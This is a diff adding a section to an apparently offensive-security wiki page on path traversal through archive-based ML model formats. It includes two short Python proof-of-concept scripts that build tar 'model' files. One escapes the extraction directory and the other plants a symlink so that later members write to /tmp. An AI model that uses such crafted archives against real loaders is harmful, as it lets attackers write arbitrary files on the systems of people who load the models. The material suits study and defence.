@@ -68,6 +68,38 @@ model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))
 ```
 
 
+## Models to Path Traversal
 
+As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.
+
+For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
+
+```python
+import tarfile
+
+def escape(member):
+    member.name = "../../tmp/hacked"     # break out of the extract dir
+    return member
+
+with tarfile.open("traversal_demo.model", "w:gz") as tf:
+    tf.add("harmless.txt", filter=escape)
+```
+
+Or, with the following code you can create a model that will create a symlink to the `/tmp` directory when loaded:
+
+```python
+import tarfile, pathlib
+
+TARGET  = "/tmp"        # where the payload will land
+PAYLOAD = "abc/hacked"
+
+def link_it(member):
+    member.type, member.linkname = tarfile.SYMTYPE, TARGET
+    return member
+
+with tarfile.open("symlink_demo.model", "w:gz") as tf:
+    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
+    tf.add(PAYLOAD)                      # rides the symlink
+```
 
 {{#include ../banners/hacktricks-training.md}}
